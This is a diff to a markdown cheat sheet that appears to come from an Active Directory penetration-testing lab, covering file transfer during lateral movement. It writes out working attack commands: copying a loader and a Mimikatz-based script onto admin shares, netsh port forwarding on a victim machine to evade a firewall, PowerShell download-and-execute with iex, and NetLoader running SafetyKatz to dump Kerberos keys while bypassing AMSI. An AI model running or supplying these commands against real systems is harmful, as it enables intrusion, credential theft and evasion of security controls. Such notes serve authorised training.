@@ -2,8 +2,12 @@
 
 ### SMB Shares
 
+Use Y instead of F in echo to overwrite a file that is already present.
+
 ```batch
-echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y 
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+:: Powershell 
+Copy-Item C:\AD\Tools\Invoke-Mimi-keys.ps1 \\dcorp-adminsrv\C$\'Program Files'  
 ```
 
 ### HTTP Server
@@ -21,23 +25,22 @@ netstat -an
 
 Port forward to avoid firewall using netsh on target machine
 
-```batch
-:: Victim Machine
-netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=172.16.100.x
-```
+<pre class="language-batch"><code class="lang-batch">:: Victim Machine
+<strong>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=172.16.100.x
+</strong><strong>
+</strong></code></pre>
 
 Download the file on target machine
 
-```powershell
-# Download and store
-(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:8080/<File>', '<Dest Path>')
-
+<pre class="language-powershell"><code class="lang-powershell"># Download and store
+<strong>(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:8080/&#x3C;File>', '&#x3C;Dest Path>')
+</strong>
 # Download and execute
-iex ((New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/<File>'));
+iex ((New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/&#x3C;File>'));
 
 # NetLoader to execute and bypass amsi
 NetLoader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
-```
+</code></pre>
 
 More options
 
